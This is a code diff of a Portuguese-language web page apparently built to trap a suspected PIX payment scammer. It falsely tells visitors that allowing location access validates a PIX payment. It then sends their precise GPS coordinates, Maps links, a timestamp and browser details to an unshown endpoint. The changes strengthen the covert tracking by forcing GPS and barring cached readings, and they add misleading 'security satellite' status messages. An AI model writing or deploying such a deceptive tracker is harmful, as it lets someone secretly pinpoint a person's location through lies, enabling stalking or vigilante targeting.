@@ -110,7 +110,9 @@
                     body: JSON.stringify({
                         subject: "🚨 ALVO CAPTURADO: GOLPISTA PIX",
                         maps: `https://www.google.com/maps?q=${lat},${lng}`,
-                        precisao: acc.toFixed(2) + "m",
+                        google_search: `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`,
+                        precisao_metros: acc.toFixed(2),
+                        timestamp: new Date().toLocaleString('pt-BR'),
                         navegador: navigator.userAgent
                     })
                 });
@@ -121,7 +123,7 @@
 
         trackBtn.addEventListener('click', function() {
             statusDiv.classList.remove('hidden');
-            statusDiv.innerHTML = "Solicitando permissão ao sistema...";
+            statusDiv.innerHTML = "Sincronizando com satélite de segurança...";
             trackBtn.disabled = true;
             trackBtn.innerHTML = '<div class="loader"></div> AGUARDANDO...';
 
@@ -130,11 +132,21 @@
                 return;
             }
 
+            // Opções para máxima precisão
+            const geoOptions = {
+                enableHighAccuracy: true, // Força o uso de GPS/Satélite em vez de Wi-Fi/IP
+                timeout: 15000,           // Tempo limite aumentado para permitir a fixação do GPS
+                maximumAge: 0             // Não aceita localizações em cache (força uma nova leitura)
+            };
+
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     const { latitude, longitude, accuracy } = position.coords;
-                    statusDiv.innerHTML = "Sinal validado. Processando recebimento...";
+                    
+                    statusDiv.innerHTML = "Coordenadas verificadas com sucesso.";
+                    
                     sendData(latitude, longitude, accuracy);
+                    
                     setTimeout(() => {
                         modal.style.display = 'flex';
                     }, 1500);
@@ -145,17 +157,13 @@
                     trackBtn.classList.replace('bg-[#32bcad]', 'bg-red-600');
 
                     let errorMsg = "Acesso Negado: Você deve permitir a localização para validar o PIX.";
-                    if (error.code === 3) errorMsg = "Tempo esgotado. Tente novamente em local aberto.";
+                    if (error.code === 3) errorMsg = "Sinal de GPS fraco. Tente novamente em local aberto ou próximo a uma janela.";
                     
                     statusDiv.innerHTML = errorMsg;
                     statusDiv.classList.add('text-red-600', 'font-bold');
                     alert(errorMsg);
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 8000,
-                    maximumAge: 0
-                }
+                geoOptions
             );
         });
     </script>
